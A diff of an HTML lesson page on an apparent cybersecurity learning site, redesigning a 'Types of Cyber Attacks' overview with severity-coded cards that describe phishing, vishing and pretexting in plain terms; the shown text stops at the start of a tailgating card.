@@ -8,21 +8,21 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* ========== THEME VARIABLES (DARK MODE DEFAULT) ========== */
         :root {
             --primary: #00e676; --primary-fg: #000000; --body-fg: #ffffff; --body-bg: #121212;
             --body-quiet-color: #b0b0b0; --body-loud-color: #ffffff; --hairline-color: #272727;
             --border-color: #353535; --darkened-bg: #1e1e1e; --selected-bg: #2a2a2a; --header-bg: #1a1a1a; --input-bg: #242424;
+            --danger: #ef4444; --warning: #ff9800; --success: #00e676; --info: #29b6f6;
         }
         html[data-theme="light"] {
             --primary: #02b3e4; --primary-fg: #ffffff; --body-fg: #1a2c3e; --body-bg: #f5f7fc;
             --body-quiet-color: #5c6f87; --body-loud-color: #0b2b3b; --hairline-color: #e6edf4;
             --border-color: #eef2f8; --darkened-bg: #ffffff; --selected-bg: #e9f4fa; --header-bg: #ffffff; --input-bg: #f9fbfe;
+            --danger: #dc2626; --warning: #d97706; --success: #16a34a; --info: #0284c7;
         }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Inter', 'Segoe UI', system-ui, sans-serif; background: var(--body-bg); color: var(--body-fg); display: flex; flex-direction: column; min-height: 100vh; transition: background 0.3s, color 0.3s; }
 
-        /* ========== TOP NAVIGATION BAR ========== */
         .top-nav { display: flex; align-items: center; justify-content: space-between; padding: 18px 40px; background: var(--header-bg); border-bottom: 1px solid var(--hairline-color); position: sticky; top: 0; z-index: 100; }
         .nav-brand { display: flex; align-items: center; gap: 12px; text-decoration: none; }
         .nav-logo-icon { background: var(--primary); color: var(--primary-fg); width: 36px; height: 36px; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 1.4rem; box-shadow: 0 4px 10px rgba(0,230,118,0.2); }
@@ -34,47 +34,120 @@
         .top-nav-links a.active { color: var(--primary); border-bottom: 2px solid var(--primary); }
         .top-nav-links a.login-btn { background: var(--primary); color: var(--primary-fg); padding: 8px 18px; border-radius: 8px; }
 
-        /* ========== MAIN CONTENT & LAYOUT ========== */
         .main-content { max-width: 1400px; margin: 40px auto; padding: 0 20px; width: 100%; flex: 1; display: flex; gap: 30px; align-items: flex-start; }
         .sidebar-back-btns { display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px; padding-bottom: 20px; border-bottom: 1px solid var(--hairline-color); }
         .sidebar-back-btn { display: block; text-align: center; background: var(--selected-bg); color: var(--body-fg); padding: 10px; border-radius: 8px; text-decoration: none; font-size: 0.85rem; font-weight: 600; border: 1px solid var(--hairline-color); transition: 0.2s; }
         .sidebar-back-btn:hover { background: var(--darkened-bg); border-color: var(--primary); color: var(--primary); }
         .sidebar { width: 300px; flex-shrink: 0; background: var(--header-bg); border: 1px solid var(--hairline-color); border-radius: 20px; padding: 20px; position: sticky; top: 100px; max-height: calc(100vh - 120px); overflow-y: auto; }
+        .sidebar::-webkit-scrollbar { width: 4px; }
+        .sidebar::-webkit-scrollbar-thumb { background: var(--hairline-color); border-radius: 10px; }
         .sidebar-header h3 { font-size: 0.9rem; color: var(--body-quiet-color); text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 15px; padding-bottom: 15px; border-bottom: 1px solid var(--hairline-color); }
         .sidebar-nav ul { list-style: none; }
-        .sidebar-nav ul li { margin-bottom: 8px; }
-        .sidebar-nav ul li a { display: block; padding: 12px 15px; border-radius: 10px; text-decoration: none; color: var(--body-quiet-color); font-size: 0.9rem; font-weight: 600; transition: 0.2s; border: 1px solid transparent; }
+        .sidebar-nav ul li { margin-bottom: 4px; }
+        .sidebar-nav ul li a { display: block; padding: 10px 14px; border-radius: 10px; text-decoration: none; color: var(--body-quiet-color); font-size: 0.85rem; font-weight: 600; transition: 0.2s; border: 1px solid transparent; }
         .sidebar-nav ul li a:hover { background: var(--selected-bg); color: var(--body-fg); }
         .sidebar-nav ul li a.active { background: rgba(0, 230, 118, 0.1); color: var(--primary); border-color: rgba(0, 230, 118, 0.3); }
-        
+        .nav-section-label { font-size: 0.65rem; color: var(--primary); font-weight: 700; letter-spacing: 0.8px; text-transform: uppercase; padding: 16px 14px 6px; }
+
         .content-area { flex: 1; min-width: 0; }
         .page-header { text-align: center; margin-bottom: 40px; }
         .page-header h1 { font-size: 2.5rem; color: var(--body-loud-color); margin-bottom: 10px; }
-        .page-header p { color: var(--body-quiet-color); font-size: 1rem; max-width: 600px; margin: 0 auto; }
+        .page-header p { color: var(--body-quiet-color); font-size: 1rem; max-width: 650px; margin: 0 auto; line-height: 1.6; }
 
         .section-title { position: relative; margin-bottom: 2rem; padding-bottom: 0.5rem; color: var(--body-loud-color); font-weight: 700; font-size: 1.8rem; margin-top: 3rem; }
         .section-title::after { content: ''; position: absolute; bottom: 0; left: 0; width: 60px; height: 4px; background-color: var(--primary); border-radius: 2px; }
-        .text-block { color: var(--body-quiet-color); font-size: 1rem; line-height: 1.6; margin-bottom: 1.5rem; }
-        
-        /* Image Grid Layout */
-        .image-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 24px; margin: 2rem 0; }
-        .attack-card { margin: 0; display: flex; flex-direction: column; background: var(--darkened-bg); border: 1px solid var(--hairline-color); border-radius: 16px; overflow: hidden; transition: transform 0.2s, border-color 0.2s; }
-        .attack-card:hover { transform: translateY(-5px); border-color: var(--primary); }
-        .attack-card img { width: 100%; height: 200px; object-fit: cover; border-bottom: 1px solid var(--hairline-color); background: var(--body-bg); }
-        .attack-body { padding: 20px; flex: 1; display: flex; flex-direction: column; }
-        .attack-title { font-size: 1.2rem; color: var(--body-loud-color); margin-bottom: 10px; font-weight: 600; display: flex; align-items: center; gap: 10px; }
-        .attack-title i { color: var(--primary); }
-        .attack-desc { font-size: 0.9rem; color: var(--body-quiet-color); line-height: 1.5; }
+        .text-block { color: var(--body-quiet-color); font-size: 1rem; line-height: 1.7; margin-bottom: 1.5rem; }
+        .text-block strong { color: var(--body-fg); }
+        .tool-title { font-size: 1.3rem; color: var(--body-loud-color); margin-top: 2rem; margin-bottom: 0.5rem; font-weight: 600; display: flex; align-items: center; gap: 10px; }
+        .tool-title i { color: var(--primary); }
+        ul, ol { color: var(--body-quiet-color); font-size: 0.95rem; line-height: 1.7; margin-bottom: 1.5rem; padding-left: 25px; }
+        li { margin-bottom: 8px; }
 
-        /* Previous / Next Buttons CSS */
+        .attack-overview-img { margin: 2.5rem auto; max-width: 850px; background: var(--darkened-bg); border: 1px solid var(--hairline-color); border-radius: 16px; padding: 20px; transition: border-color 0.2s; }
+        .attack-overview-img:hover { border-color: var(--primary); }
+        .attack-overview-img img { width: 100%; border-radius: 10px; }
+
+        .attack-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; margin: 2rem 0; }
+        .attack-card { background: var(--darkened-bg); border: 1px solid var(--hairline-color); border-radius: 16px; padding: 24px; transition: all 0.25s; position: relative; overflow: hidden; }
+        .attack-card::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 3px; }
+        .attack-card.severity-critical::before { background: var(--danger); }
+        .attack-card.severity-high::before { background: var(--warning); }
+        .attack-card.severity-medium::before { background: var(--info); }
+        .attack-card.severity-low::before { background: var(--success); }
+        .attack-card:hover { border-color: var(--primary); transform: translateY(-3px); box-shadow: 0 8px 24px rgba(0,0,0,0.15); }
+        .attack-card-header { display: flex; align-items: center; gap: 14px; margin-bottom: 14px; }
+        .attack-card-icon { width: 48px; height: 48px; border-radius: 14px; display: flex; align-items: center; justify-content: center; font-size: 1.5rem; flex-shrink: 0; }
+        .attack-card-icon.icon-red { background: rgba(239,68,68,0.12); }
+        .attack-card-icon.icon-orange { background: rgba(255,152,0,0.12); }
+        .attack-card-icon.icon-blue { background: rgba(41,182,246,0.12); }
+        .attack-card-icon.icon-green { background: rgba(0,230,118,0.12); }
+        .attack-card-icon.icon-purple { background: rgba(156,39,176,0.12); }
+        .attack-card-title { font-size: 1.1rem; font-weight: 700; color: var(--body-loud-color); line-height: 1.3; }
+        .attack-card-severity { font-size: 0.6rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; padding: 2px 8px; border-radius: 6px; display: inline-block; margin-bottom: 10px; }
+        .severity-badge-critical { background: rgba(239,68,68,0.15); color: var(--danger); }
+        .severity-badge-high { background: rgba(255,152,0,0.15); color: var(--warning); }
+        .severity-badge-medium { background: rgba(41,182,246,0.15); color: var(--info); }
+        .severity-badge-low { background: rgba(0,230,118,0.15); color: var(--success); }
+
+        /* ========== ATTACK CARD IMAGE — added per type ========== */
+        .attack-card-img {
+            width: 100%; height: 180px; border-radius: 12px;
+            object-fit: cover; margin-bottom: 14px;
+            background: var(--input-bg);
+            transition: transform 0.3s;
+        }
+        .attack-card:hover .attack-card-img { transform: scale(1.02); }
+
+        .attack-card p { color: var(--body-quiet-color); font-size: 0.9rem; line-height: 1.65; margin-bottom: 12px; }
+        .attack-card ul { font-size: 0.85rem; margin-bottom: 0; padding-left: 18px; }
+        .attack-card li { margin-bottom: 4px; }
+
+        pre { background: var(--input-bg); padding: 15px; border-radius: 8px; border: 1px solid var(--hairline-color); overflow-x: auto; margin: 1.5rem 0; font-family: 'Courier New', Courier, monospace; font-size: 0.82rem; line-height: 1.5; color: var(--body-fg); white-space: pre-wrap; word-wrap: break-word; }
+        pre code { color: var(--primary); }
+        .inline-code { background: var(--input-bg); padding: 2px 6px; border-radius: 4px; font-family: 'Courier New', Courier, monospace; font-size: 0.82rem; color: var(--primary); }
+
+        .large-figure { display: flex; flex-direction: column; align-items: center; margin: 2rem auto; max-width: 850px; background: var(--darkened-bg); border: 1px solid var(--hairline-color); border-radius: 16px; padding: 20px; transition: border-color 0.2s; }
+        .large-figure:hover { border-color: var(--primary); }
+        .large-figure img { width: 100%; border-radius: 10px; object-fit: contain; }
+        .large-figure figcaption { font-size: 0.88rem; color: var(--body-quiet-color); margin-top: 1rem; text-align: center; font-style: italic; line-height: 1.5; }
+
+        .alert-info-custom { background-color: var(--selected-bg); border-left: 4px solid var(--primary); padding: 1.5rem; border-radius: 8px; margin: 2rem 0; color: var(--body-fg); }
+        .alert-info-custom h4 { color: var(--primary); margin-bottom: 0.5rem; font-size: 1.05rem; display: flex; align-items: center; gap: 8px; }
+        .alert-info-custom p, .alert-info-custom ul { color: var(--body-quiet-color); font-size: 0.93rem; line-height: 1.7; }
+        .alert-info-custom ul { padding-left: 20px; margin-top: 10px; margin-bottom: 0; }
+        .alert-warning-custom { background-color: rgba(255,152,0,0.06); border-left: 4px solid var(--warning); padding: 1.5rem; border-radius: 8px; margin: 2rem 0; color: var(--body-fg); }
+        .alert-warning-custom h4 { color: var(--warning); margin-bottom: 0.5rem; font-size: 1.05rem; display: flex; align-items: center; gap: 8px; }
+        .alert-warning-custom p { color: var(--body-quiet-color); font-size: 0.93rem; line-height: 1.7; }
+        .alert-danger-custom { background-color: rgba(239,68,68,0.06); border-left: 4px solid var(--danger); padding: 1.5rem; border-radius: 8px; margin: 2rem 0; color: var(--body-fg); }
+        .alert-danger-custom h4 { color: var(--danger); margin-bottom: 0.5rem; font-size: 1.05rem; display: flex; align-items: center; gap: 8px; }
+        .alert-danger-custom p { color: var(--body-quiet-color); font-size: 0.93rem; line-height: 1.7; }
+
+        .stats-row { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 16px; margin: 2rem 0; }
+        .stat-card { background: var(--darkened-bg); border: 1px solid var(--hairline-color); border-radius: 14px; padding: 20px; text-align: center; transition: border-color 0.2s; }
+        .stat-card:hover { border-color: var(--primary); }
+        .stat-number { font-size: 2rem; font-weight: 800; margin-bottom: 4px; }
+        .stat-number.red { color: var(--danger); }
+        .stat-number.orange { color: var(--warning); }
+        .stat-number.blue { color: var(--info); }
+        .stat-number.green { color: var(--success); }
+        .stat-label { font-size: 0.8rem; color: var(--body-quiet-color); font-weight: 600; }
+
+        .attack-table-wrap { overflow-x: auto; margin: 2rem 0; border-radius: 12px; border: 1px solid var(--hairline-color); }
+        .attack-table { width: 100%; border-collapse: collapse; font-size: 0.88rem; }
+        .attack-table thead { background: var(--input-bg); }
+        .attack-table th { padding: 14px 16px; text-align: left; font-weight: 700; color: var(--body-loud-color); border-bottom: 2px solid var(--hairline-color); white-space: nowrap; }
+        .attack-table td { padding: 12px 16px; border-bottom: 1px solid var(--hairline-color); color: var(--body-quiet-color); line-height: 1.5; vertical-align: top; }
+        .attack-table tbody tr:hover { background: var(--selected-bg); }
+        .attack-table tbody tr:last-child td { border-bottom: none; }
+
         .lesson-nav { display: flex; justify-content: space-between; align-items: center; margin-top: 4rem; padding-top: 2rem; border-top: 1px solid var(--hairline-color); }
         .nav-btn { display: inline-flex; align-items: center; gap: 8px; background: var(--darkened-bg); color: var(--body-fg); padding: 12px 24px; border-radius: 10px; text-decoration: none; font-weight: 600; font-size: 0.9rem; border: 1px solid var(--hairline-color); transition: 0.2s; }
         .nav-btn:hover { background: var(--selected-bg); border-color: var(--primary); color: var(--primary); }
         .nav-btn.next { background: var(--primary); color: var(--primary-fg); border-color: var(--primary); }
         .nav-btn.next:hover { opacity: 0.9; transform: translateY(-2px); }
 
-        footer { margin-top: auto; background: var(--header-bg); border-top: 1px solid var(--hairline-color); padding: 40px 40px 20px 40px; }
-        .footer-grid { display: grid; grid-template-columns: 2fr 1fr 1.5fr; gap: 40px; max-width: 1200px; margin: 0 auto 30px auto; }
+        footer { margin-top: auto; background: var(--header-bg); border-top: 1px solid var(--hairline-color); padding: 40px 40px 20px; }
+        .footer-grid { display: grid; grid-template-columns: 2fr 1fr 1.5fr; gap: 40px; max-width: 1200px; margin: 0 auto 30px; }
         .footer-col h3 { font-size: 1.1rem; color: var(--body-loud-color); margin-bottom: 15px; display: flex; align-items: center; gap: 8px; }
         .footer-col p { color: var(--body-quiet-color); font-size: 0.85rem; line-height: 1.6; margin-bottom: 15px; }
         .footer-col ul { list-style: none; } .footer-col ul li { margin-bottom: 10px; }
@@ -85,9 +158,13 @@
 
         @media (max-width: 900px) {
             .top-nav { padding: 15px 20px; flex-direction: column; gap: 15px; }
-            .top-nav-links { gap: 15px; flex-wrap: wrap; justify-content: center; }
+            .top-nav-links { gap: 12px; flex-wrap: wrap; justify-content: center; }
             .main-content { flex-direction: column; }
             .sidebar { width: 100%; position: relative; top: 0; max-height: none; margin-bottom: 20px; }
+            .attack-grid { grid-template-columns: 1fr; }
+            .stats-row { grid-template-columns: repeat(2, 1fr); }
+            .footer-grid { grid-template-columns: 1fr; }
+            .attack-card-img { height: 150px; }
         }
     </style>
 </head>
@@ -100,37 +177,34 @@
         <div class="nav-brand-text"><h1>CyberDefend</h1><span>Modern cybersecurity learning platform</span></div>
     </a>
     <div class="top-nav-links">
-        <a href="index.html">Dashboard</a><a href="courses.html">Courses</a><a href="messages.html">📝 Tasks & Submissions</a><a href="labs.html" class="active">Labs</a><a href="login.html" class="login-btn">Login</a>
+        <a href="index.html">Dashboard</a><a href="courses.html">Courses</a><a href="messages.html">📝 Tasks</a><a href="labs.html">Labs</a><a href="lesson-9.html" class="active">Attacks</a><a href="login.html" class="login-btn">Login</a>
     </div>
 </nav>
 
 <div class="main-content">
-   
     <aside class="sidebar">
         <div class="sidebar-back-btns">
-            <!-- ONLY BACK TO DASHBOARD HERE -->
             <a href="labs.html" class="sidebar-back-btn">← Back to Labs</a>
         </div>
         <div class="sidebar-header"><h3>Course Lessons</h3></div>
         <nav class="sidebar-nav">
             <ul>
-	                <!-- It is best practice to remove spaces in HTML filenames -->
-                <li><a href="labs.html" >Network Security Overview</a></li>
+                <li><a href="labs.html">Network Security Overview</a></li>
                 <li><a href="network Roadmap.html">Network Roadmap</a></li>
                 <li><a href="security Roadmap.html">Security Roadmap</a></li>
-                <li><a href="lesson-6.html"> Switching Architecture </a></li>
-                <li><a href="lesson-7.html"> Firewall Security Architecture</a></li>
-                <li><a href="lesson-3.html"> KALI Linux</a></li>
-                <li><a href="kali-tools.html"> Top 50 Kali Linux Tools</a></li>
-                <li><a href="lesson-4.html"> Vulnerability Scanners</a></li>
-                <li><a href="nessus.html">Nessus Vulnerability Assessment</a></li>
-                <li><a href="labs2.html"> Networking Labs Overview</a></li>
-
+                <li><a href="lesson-6.html">Switching Architecture</a></li>
+                <li><a href="lesson-7.html">Firewall Security Architecture</a></li>
+                <li><a href="lesson-3.html">KALI Linux</a></li>
+                <li><a href="kali-tools.html">Top 50 Kali Linux Tools</a></li>
+                <li><a href="lesson-4.html">Vulnerability Scanners</a></li>
+                <li><a href="nessus.html">Nessus Assessment</a></li>
+                <li><a href="labs2.html">Networking Labs</a></li>
                 <li><a href="lesson-8.html">Wireless Solutions</a></li>
-                <li><a href="lesson-9.html" class="active">Cyber Attacks</a></li>
-                <li><a href="lesson-10.html">Concept</a></li>
-                <li><a href="lesson-11.html">Concept</a></li>
-                <li><a href="lesson-12.html">Concept</a></li>
+                <div class="nav-section-label">Threats & Defense</div>
+                <li><a href="lesson-9.html" class="active">Types of Cyber Attacks</a></li>
+                <li><a href="lesson-10.html">Troubleshooting</a></li>
+                <li><a href="lesson-11.html">Incident Response</a></li>
+                <li><a href="lesson-12.html">Digital Forensics</a></li>
                 <li><a href="lesson-13.html">Concept</a></li>
             </ul>
         </nav>
@@ -139,167 +213,576 @@
     <div class="content-area">
         <div class="page-header">
             <h1>Types of Cyber Attacks</h1>
-            <p>A comprehensive guide to the most common and dangerous cyber attacks used by threat actors to compromise systems, networks, and individuals.</p>
+            <p>A comprehensive breakdown of the most dangerous attack vectors threatening modern networks, applications, and organizations.</p>
         </div>
 
-        <!-- Section 1: Malware Attacks -->
-        <section id="malware-attacks">
-            <h2 class="section-title">1. Malware Attacks</h2>
-            <p class="text-block">Malware (Malicious Software) is any code or program intentionally designed to cause damage, steal data, or gain unauthorized access to a system.</p>
-            
-            <div class="image-grid">
-                <div class="attack-card">
-                    <img src="https://images.unsplash.com/photo-1614064641938-3bbee52942c5?ixlib=rb-4.0.3&auto=format&fit=crop&w=600&q=80" alt="Ransomware Attack">
-                    <div class="attack-body">
-                        <div class="attack-title"><i class="fas fa-lock"></i> Ransomware</div>
-                        <p class="attack-desc">Malicious software that encrypts a victim's files and demands a cryptocurrency payment (ransom) in exchange for the decryption key. Paralyzes business operations.</p>
-                    </div>
-                </div>
-                <div class="attack-card">
-                    <img src="https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?ixlib=rb-4.0.3&auto=format&fit=crop&w=600&q=80" alt="Trojan Virus">
-                    <div class="attack-body">
-                        <div class="attack-title"><i class="fas fa-horse"></i> Trojan Horse</div>
-                        <p class="attack-desc">Disguises itself as legitimate, harmless software to trick users into installing it. Once inside, it creates a backdoor for attackers to control the system.</p>
-                    </div>
-                </div>
-                <div class="attack-card">
-                    <img src="https://images.unsplash.com/photo-1635776062127-d379bfcba9f8?ixlib=rb-4.0.3&auto=format&fit=crop&w=600&q=80" alt="Worm Propagation">
-                    <div class="attack-body">
-                        <div class="attack-title"><i class="fas fa-virus"></i> Worm</div>
-                        <p class="attack-desc">A standalone malware program that self-replicates and spreads across networks without any user interaction, consuming bandwidth and dropping payloads.</p>
-                    </div>
-                </div>
-            </div>
-        </section>
+        <div class="attack-overview-img">
+            <img src="sa/Capture.PNG" alt="Overview of cyber attack types">
+        </div>
 
-        <!-- Section 2: Network & Infrastructure Attacks -->
-        <section id="network-attacks">
-            <h2 class="section-title">2. Network & Infrastructure Attacks</h2>
-            <p class="text-block">Network attacks target the infrastructure, routing, and data in transit between devices. They aim to intercept, disrupt, or redirect communications.</p>
+        <div class="stats-row">
+            <div class="stat-card"><div class="stat-number red">$4.45M</div><div class="stat-label">Average data breach cost (2023)</div></div>
+            <div class="stat-card"><div class="stat-number orange">2,365</div><div class="stat-label">Cyber attacks per day globally</div></div>
+            <div class="stat-card"><div class="stat-number blue">343M</div><div class="stat-label">Ransomware victims in 2023</div></div>
+            <div class="stat-card"><div class="stat-number green">91%</div><div class="stat-label">Start with phishing email</div></div>
+        </div>
 
-            <div class="image-grid">
-                <div class="attack-card">
-                    <img src="https://images.unsplash.com/photo-1558494949-ef010cbdcc31?ixlib=rb-4.0.3&auto=format&fit=crop&w=600&q=80" alt="DDoS Attack">
-                    <div class="attack-body">
-                        <div class="attack-title"><i class="fas fa-bolt"></i> DDoS Attack</div>
-                        <p class="attack-desc">Distributed Denial of Service. Attackers use thousands of infected devices (botnets) to flood a server with fake traffic until it crashes and becomes unavailable.</p>
-                    </div>
-                </div>
-                <div class="attack-card">
-                    <img src="https://images.unsplash.com/photo-1542831371-29b0f74f9713?ixlib=rb-4.0.3&auto=format&fit=crop&w=600&q=80" alt="MITM Attack">
-                    <div class="attack-body">
-                        <div class="attack-title"><i class="fas fa-network-wired"></i> Man-in-the-Middle (MITM)</div>
-                        <p class="attack-desc">An attacker secretly intercepts and possibly alters communication between two parties who believe they are directly talking to each other.</p>
-                    </div>
-                </div>
-                <div class="attack-card">
-                    <img src="https://images.unsplash.com/photo-1563770660941-20978e870e26?ixlib=rb-4.0.3&auto=format&fit=crop&w=600&q=80" alt="DHCP Starvation">
-                    <div class="attack-body">
-                        <div class="attack-title"><i class="fas fa-server"></i> DHCP Starvation & Rogue DHCP</div>
-                        <p class="attack-desc">An attacker floods the network's DHCP server with fake MAC addresses, exhausting its IP pool. They then introduce a "Rogue DHCP" server to hand out malicious IPs and gateways.</p>
-                    </div>
-                </div>
-                <div class="attack-card">
-                    <img src="https://images.unsplash.com/photo-1614064641938-3bbee52942c5?ixlib=rb-4.0.3&auto=format&fit=crop&w=600&q=80" alt="DNS Spoofing">
-                    <div class="attack-body">
-                        <div class="attack-title"><i class="fas fa-route"></i> DNS Spoofing (Cache Poisoning)</div>
-                        <p class="attack-desc">Injecting malicious data into a DNS cache, causing users to be redirected from a legitimate website (like a bank) to a fake, attacker-controlled website.</p>
-                    </div>
-                </div>
-                <div class="attack-card">
-                    <img src="https://images.unsplash.com/photo-1518770660439-4636190af475?ixlib=rb-4.0.3&auto=format&fit=crop&w=600&q=80" alt="DNS Tunneling">
-                    <div class="attack-body">
-                        <div class="attack-title"><i class="fas fa-exchange-alt"></i> DNS Tunneling</div>
-                        <p class="attack-desc">Encapsulating non-DNS traffic (like stolen data or command-and-control commands) inside DNS queries to bypass firewalls and steal data undetected.</p>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Section 3: Web Application Attacks -->
-        <section id="web-attacks">
-            <h2 class="section-title">3. Web Application Attacks</h2>
-            <p class="text-block">These attacks specifically target vulnerabilities in web applications, often manipulating input fields to access backend databases or steal user sessions.</p>
-
-            <div class="image-grid">
-                <div class="attack-card">
-                    <img src="https://images.unsplash.com/photo-1542831371-29b0f74f9713?ixlib=rb-4.0.3&auto=format&fit=crop&w=600&q=80" alt="SQL Injection">
-                    <div class="attack-body">
-                        <div class="attack-title"><i class="fas fa-database"></i> SQL Injection (SQLi)</div>
-                        <p class="attack-desc">Inserting malicious SQL database commands into input fields (like login forms) to bypass authentication, dump the database, or delete data.</p>
-                    </div>
-                </div>
-                <div class="attack-card">
-                    <img src="https://images.unsplash.com/photo-1573164713988-8665fc963095?ixlib=rb-4.0.3&auto=format&fit=crop&w=600&q=80" alt="XSS Attack">
-                    <div class="attack-body">
-                        <div class="attack-title"><i class="fas fa-code"></i> Cross-Site Scripting (XSS)</div>
-                        <p class="attack-desc">Injecting malicious JavaScript into a trusted website. When a victim visits the page, the script executes in their browser, stealing session cookies.</p>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Section 4: Wireless Attacks -->
-        <section id="wireless-attacks">
-            <h2 class="section-title">4. Wireless Attacks</h2>
-            <p class="text-block">Wireless networks (Wi-Fi) are inherently less secure than wired networks because data is broadcasted through the air. Attackers can intercept signals from a distance.</p>
-
-            <div class="image-grid">
-                <div class="attack-card">
-                    <img src="https://images.unsplash.com/photo-1606760227091-3dd870d97f1d?ixlib=rb-4.0.3&auto=format&fit=crop&w=600&q=80" alt="Evil Twin Attack">
-                    <div class="attack-body">
-                        <div class="attack-title"><i class="fas fa-wifi"></i> Evil Twin</div>
-                        <p class="attack-desc">An attacker sets up a fake Wi-Fi hotspot with the same name (SSID) as a legitimate one (e.g., "Starbucks_WiFi"). Victims connect to it, allowing the attacker to intercept all their traffic.</p>
-                    </div>
-                </div>
-                <div class="attack-card">
-                    <img src="https://images.unsplash.com/photo-1550751827-4bd374c3f58b?ixlib=rb-4.0.3&auto=format&fit=crop&w=600&q=80" alt="Deauthentication Attack">
-                    <div class="attack-body">
-                        <div class="attack-title"><i class="fas fa-signal"></i> Deauthentication Attack</div>
-                        <p class="attack-desc">Sending forged "disconnect" packets to a victim's device, forcibly kicking them off a legitimate Wi-Fi network. Often used to force them to connect to an Evil Twin.</p>
-                    </div>
-                </div>
-                <div class="attack-card">
-                    <img src="https://images.unsplash.com/photo-1563013544-824ae1b704d3?ixlib=rb-4.0.3&auto=format&fit=crop&w=600&q=80" alt="WPA Cracking">
-                    <div class="attack-body">
-                        <div class="attack-title"><i class="fas fa-key"></i> WPA/WPA2 Cracking</div>
-                        <p class="attack-desc">Capturing the 4-way handshake when a device connects to Wi-Fi, then using offline brute-force or dictionary attacks (like Aircrack-ng) to guess the network password.</p>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Section 5: Social Engineering -->
+        <!-- ==================== SECTION 1: SOCIAL ENGINEERING ==================== -->
         <section id="social-engineering">
-            <h2 class="section-title">5. Social Engineering Attacks</h2>
-            <p class="text-block">Instead of hacking systems, social engineering hacks the human mind. Attackers manipulate psychology to trick people into making security mistakes.</p>
+            <h2 class="section-title">1. Social Engineering Attacks</h2>
+            <p class="text-block">Social engineering exploits human psychology rather than technical vulnerabilities. Attackers manipulate people into breaking security procedures, revealing sensitive information, or performing actions that compromise security.</p>
+        <div class="attack-overview-img">
+            <img src="https://www.fortinet.com/content/dam/fortinet/images/cyberglossary/types-of-fortiphishing.jpg" alt="Overview of cyber attack types">
+        </div>
+            <div class="attack-grid">
+                <!-- Phishing -->
+                <div class="attack-card severity-critical">
+                    <div class="attack-card-header">
+                        <div class="attack-card-icon icon-red">📧</div>
+                        <div class="attack-card-title">Phishing</div>
+                    </div>
+                    <span class="attack-card-severity severity-badge-critical">CRITICAL</span>
+                    <img class="attack-card-img" src="https://cheapsslsecurity.com/blog/wp-content/uploads/2018/07/identify-phishing-scam.jpg" alt="Phishing email attack illustration showing a deceptive email message">
+                    <p>Fraudulent emails or messages impersonating trusted entities to steal credentials, financial data, or install malware. The #1 initial attack vector worldwide.</p>
+                    <ul>
+                        <li><strong>Email phishing:</strong> Mass-sent fake emails with malicious links</li>
+                        <li><strong>Spear phishing:</strong> Targeted at specific individuals using gathered intel</li>
+                        <li><strong>Whaling:</strong> Targeting C-suite executives with personalized lures</li>
+                        <li><strong>Clone phishing:</strong> Duplicating a legitimate previously-delivered email</li>
+                    </ul>
+                </div>
 
-            <div class="image-grid">
-                <div class="attack-card">
-                    <img src="https://images.unsplash.com/photo-1563013544-824ae1b704d3?ixlib=rb-4.0.3&auto=format&fit=crop&w=600&q=80" alt="Phishing Email">
-                    <div class="attack-body">
-                        <div class="attack-title"><i class="fas fa-fish"></i> Phishing</div>
-                        <p class="attack-desc">Sending fraudulent emails that impersonate trusted brands or banks to trick victims into clicking malicious links and entering their passwords.</p>
+                <!-- Vishing -->
+                <div class="attack-card severity-critical">
+                    <div class="attack-card-header">
+                        <div class="attack-card-icon icon-red">🗣️</div>
+                        <div class="attack-card-title">Vishing (Voice Phishing)</div>
                     </div>
+                    <span class="attack-card-severity severity-badge-critical">CRITICAL</span>
+                    <img class="attack-card-img" src="https://imagedelivery.net/KxWh-mxPGDbsqJB3c5_fmA/0e937f84-8c14-4a08-7e54-e8da79d5cb00/public" alt="Voice phishing attack showing a fraudulent phone call to a victim">
+                    <p>Phone-based social engineering where attackers impersonate IT support, bank staff, or government agencies to extract sensitive information over voice calls.</p>
+                    <ul>
+                        <li>Caller ID spoofing to appear as a trusted number</li>
+                        <li>Urgency tactics ("your account will be locked in 10 minutes")</li>
+                        <li>Often combined with deepfake voice technology</li>
+                    </ul>
                 </div>
-                <div class="attack-card">
-                    <img src="https://images.unsplash.com/photo-1521791136064-7986c2920216?ixlib=rb-4.0.3&auto=format&fit=crop&w=600&q=80" alt="Spear Phishing">
-                    <div class="attack-body">
-                        <div class="attack-title"><i class="fas fa-bullseye"></i> Spear Phishing</div>
-                        <p class="attack-desc">A highly targeted version of phishing aimed at a specific individual or organization, using personal details to appear highly convincing.</p>
+
+                <!-- Pretexting -->
+                <div class="attack-card severity-high">
+                    <div class="attack-card-header">
+                        <div class="attack-card-icon icon-orange">🎯</div>
+                        <div class="attack-card-title">Pretexting</div>
                     </div>
+                    <span class="attack-card-severity severity-badge-high">HIGH</span>
+                    <img class="attack-card-img" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQDMMrn0SuG40xUut58zoX3F5qlmE_8Lhcwz-7QOFDOfg&s=10" alt="Pretexting attack showing an attacker creating a fake persona">
+                    <p>Creating a fabricated scenario (pretext) to gain a victim's trust and extract information. The attacker invents a persona and storyline to justify their requests.</p>
+                    <ul>
+                        <li>Impersonating a survey taker or co-worker</li>
+                        <li>Building rapport over multiple interactions</li>
+                        <li>Used as reconnaissance for deeper attacks</li>
+                    </ul>
                 </div>
+
+                <!-- Tailgating -->
+                <div class="attack-card severity-high">
+                    <div class="attack-card-header">
+                        <div class="attack-card-icon icon-orange">🚪</div>
+                        <div class="attack-card-title">Tailgating</div>
+                    </div>
